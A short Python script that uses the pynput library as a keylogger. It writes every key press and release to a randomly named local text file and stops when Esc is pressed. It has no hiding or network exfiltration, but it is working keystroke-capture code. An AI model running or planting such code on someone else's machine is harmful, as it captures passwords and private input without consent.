from random import randint
from pynput.keyboard import Key, Listener

# Generate a random output filename
output = 'key_log' + str(randint(0, 10000)) + '.txt'


with open(output, 'w') as f:
    pass

def on_press(key):
    try:
        with open(output, 'a') as f:
            # Log the key that was pressed
            f.write(f'[Key Pressed] {key}\n')
    except Exception as e:
        print(f"An error occurred: {e}")

def on_release(key):
    try:
        with open(output, 'a') as f:
            # Log the key that was released
            f.write(f'[Key Released] {key}\n')
    except Exception as e:
        print(f"An error occurred: {e}")

    # Stop listener if escape key is pressed
    if key == Key.esc:
        return False

# Set up the listener for key press and release
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()